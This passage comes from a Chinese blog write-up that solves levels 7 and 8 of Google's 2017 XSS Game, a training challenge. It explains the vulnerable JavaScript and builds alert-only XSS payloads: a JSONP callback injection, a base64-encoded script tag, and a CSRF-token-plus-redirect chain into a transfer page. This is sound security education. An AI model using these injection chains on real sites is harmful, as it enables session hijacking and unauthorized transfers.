(data.pictures) data.pictures.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;img src=&quot;/static/img/&#x27;</span> + url + <span class="string">&#x27;&quot;&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure>
+<p>我们关注一下下面这行代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;jsonp?menu=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(menu) + <span class="string">&#x27;&quot;&gt;&lt;/script&gt;&#x27;</span>); </span><br></pre></td></tr></table></figure>
+<p>因为 encodeURIComponent 的存在，我们截断 script 标签并加入 img 用 onerror 执行 alert 的方式行不通，写入的内容在转义后会被浏览器解析为一个不会被解析成 html 标签的字符串。</p>
+<blockquote>
+<p>在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞：<br><code>http://127.0.0.1/getUsers.php?callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
+</blockquote>
+<p>我们来试着请求一下，发现123回显到了最前面</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310100606514.png" alt="image-20210310100606514"></p>
+<p>所以我们可以构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xssgame.com&#x2F;f&#x2F;wmOM2q5NJnZS&#x2F;jsonp?callback&#x3D;alert(1)%3B%2F%2F</span><br><span class="line">&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310101624891.png" alt="image-20210310101624891"></p>
+<ul>
+<li>过程</li>
+</ul>
+<p>给 menu 传入经过 base64 编码后的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&#39;jsonp?callback&#x3D;alert();&#x2F;&#x2F;&#39;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>再前端会执行</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;jsonp?menu=&#x27;</span> + <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;jsonp?callback=alert();//&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> + <span class="string">&#x27;&quot;&gt;&lt;/script&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>把这个<code>&lt;script&gt;</code>标签显示在前端，然后前端访问这个标签里面的src，返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(&#123;&quot;title&quot;:&quot;Error, no such menu: &lt;script src&#x3D;&#39;jsonp?callback&#x3D;alert();&#x2F;&#x2F;&#39;&gt;&lt;&#x2F;script&gt;&quot;&#125;)</span><br></pre></td></tr></table></figure>
+<p>返回的内容会执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (data.title) document.write(&#39;&lt;h1&gt;&#39; + data.title + &#39;&lt;&#x2F;h1&gt;&#39;);</span><br></pre></td></tr></table></figure>
+<p>将返回的内容中的title部分显示出来，里面的 <code>&lt;script&gt;</code> 标签触发一个请求，script 而请求的返回内容为：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert();&#x2F;&#x2F;&#39;&gt;&lt;&#x2F;script&gt;(&#123;&quot;title&quot;:&quot;Welcome to my Website!&quot;,&quot;pictures&quot;:[&quot;const.png&quot;]&#125;)</span><br></pre></td></tr></table></figure>
+<p>alert(); 后面被注释掉，执行 alert();</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xssgame.com&#x2F;f&#x2F;wmOM2q5NJnZS&#x2F;?menu&#x3D;PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCk7Ly8nPjwvc2NyaXB0Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310104440678.png" alt="image-20210310104440678"></p>
+<ul>
+<li>查看代码</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Read cookie.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">name</span></span> - Name of the cookie</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>Cookie value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> match = <span class="built_in">RegExp</span>(<span class="string">&#x27;(?:^|;)\\s*&#x27;</span> + name + <span class="string">&#x27;=([^;]*)&#x27;</span>).exec(<span class="built_in">document</span>.cookie);</span><br><span class="line">    <span class="keyword">return</span> match &amp;&amp; match[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> username = readCookie(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (username) &#123;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;h1&gt;Welcome &#x27;</span> + username + <span class="string">&#x27;!&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    csrf_token.value = readCookie(<span class="string">&#x27;csrf_token&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>HTML页面的生命周期有以下三个重要事件：</p>
+<ul>
+<li><code>DOMContentLoaded</code> —— 浏览器已经完全加载了 HTML，DOM 树已经构建完毕，但是像是 <code>&lt;img&gt;</code> 和样式表等外部资源可能并没有下载完毕。</li>
+<li><code>load</code> —— 浏览器已经加载了所有的资源（图像，样式表等）。</li>
+<li><code>beforeunload/unload</code> —— 当用户离开页面的时候触发。</li>
+</ul>
+<p>每个事件都有特定的用途</p>
+<ul>
+<li><code>DOMContentLoaded</code> —— DOM 加载完毕，所以 JS 可以访问所有 DOM 节点，初始化界面。</li>
+<li><code>load</code> —— 附加资源已经加载完毕，可以在此事件触发时获得图像的大小（如果没有被在 HTML/CSS 中指定）</li>
+<li><code>beforeunload/unload</code> —— 用户正在离开页面：可以询问用户是否保存了更改以及是否确定要离开页面。</li>
+</ul>
+</blockquote>
+<p>尝试设置名字为123，点击Set ，有三个参数，name，value，和 redirect（跳转页面）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xssgame.com&#x2F;f&#x2F;d9u16LTxchEi&#x2F;set?name&#x3D;name&amp;value&#x3D;123&amp;redirect&#x3D;index</span><br></pre></td></tr></table></figure>
+<p>然后，查看cookie，显示 name=123，看来这是设置cookie的值，同时我们发现cookie有个csrf_token，同理我们应该可以这样设置csrf_token的内容</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310110714849.png" alt="image-20210310110714849"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set?name&#x3D;csrf_token&amp;value&#x3D;token&amp;redirect&#x3D;index</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310114011334.png" alt="image-20210310114011334"></p>
+<p>Wire transfer:</p>
+<p>正常情况下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xssgame.com&#x2F;f&#x2F;d9u16LTxchEi&#x2F;transfer?name&#x3D;13&amp;amount&#x3D;123&amp;csrf_token&#x3D;token</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310114211813.png" alt="image-20210310114211813"></p>
+<p>当我们输入<code>amount</code>不是数字，会显示出amount的内容，我们的输出点就在amount了</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310114301503.png" alt="image-20210310114301503"></p>
+<p>如果amount的值是payload，会成功弹窗，但是他会提示其他用户打开时候的token和我们的并不一样，因此需要更进一步。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310114736419.png" alt="image-20210310114736419"></p>
+<p>这时候我们回头整理一下，set 可以设置csrf_token，并且有个跳转参数，Wire transfer 可以执行xss攻击；那么我们就可以先在set 设置csrf_token，然后跳转到transfer执行xss攻击，这样不管是谁访问都会受到攻击。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set?name&#x3D;csrf_token&amp;value&#x3D;token&amp;redirect&#x3D;transfer?name&#x3D;god&amp;amount&#x3D;&lt;script&gt;alert()&lt;&#x2F;script&gt;&amp;csrf_token&#x3D;token</span><br></pre></td></tr></table></figure>
+<p>但我们要注意&amp;符号，如果直接访问，redirect的值只有一部分：transfer?name=god</p>
+<p>因此我们要URL编码一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set?name&#x3D;csrf_token&amp;value&#x3D;token&amp;redirect&#x3D;transfer%3Fname%3Dgod%26amount%3D%3Cscript%3Ealert()%3C%2Fscript%3E%26csrf_token%3Dtoken</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/133384.html" >Google最新XSS Game Writeup<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/f70744029d5e" >Google xss挑战赛(2017) writeup<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.lhaihai.top/post/xssgame/" >XSS Game<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Google XSS game(2017)</li>
+        <li>Post author：John_Frod</li>
+        <li>Create time：2021-03-10 12:08:29</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2021/03/10/Google XSS game(2017)/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/03/10/Google%20XSS%20game/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Google XSS game</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center" >
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                    
+                </main>
+
+            </div>
+
+            <div class="page-main-content-bottom">
+                <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">John_Frod</a>
+        </div>
+        
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
+        </div>
+    </div>
+</footer>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="sidebar-tools">
+        <div class="tools-container">
+    <ul class="tools-list">
+        
+            <li class="search popup-trigger">
+                <i class="fas fa-search"></i>
+            </li>
+        
+
+        
+
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+    </ul>
+</div>
+
+    </div>
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-top flex-center">
+            <i class="fas fa-arrow-up"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="tools-ul-1">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+    </ul>
+</div>
+
+    </div>
+
+    <!-- page aside -->
+    <aside class="page-aside">
+        
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Google-XSS-game-2017"><span class="nav-text">Google XSS game(2017)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-1"><span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-2"><span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-3"><span class="nav-text">Level 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level4"><span class="nav-text">Level4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-5"><span class="nav-text">Level 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-6"><span class="nav-text">Level 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-7"><span class="nav-text">Level 7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-8"><span class="nav-text">Level 8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
+    </div>
+</div>
+        
+    </aside>
+
+    <!-- image viewer -->
+    <div class="image-viewer-container">
+    <div class="img-box">
+        <img src="">
+    </div>
+</div>
+
+
+</div>
+
+
+
+    <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-icon">
+            <i class="fas fa-search"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/local-search.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/left-side-toggle.js"></script>
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/code-copy.js"></script>
+    
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/toc.js"></script>
+    
+
+
+</body>
+</html>
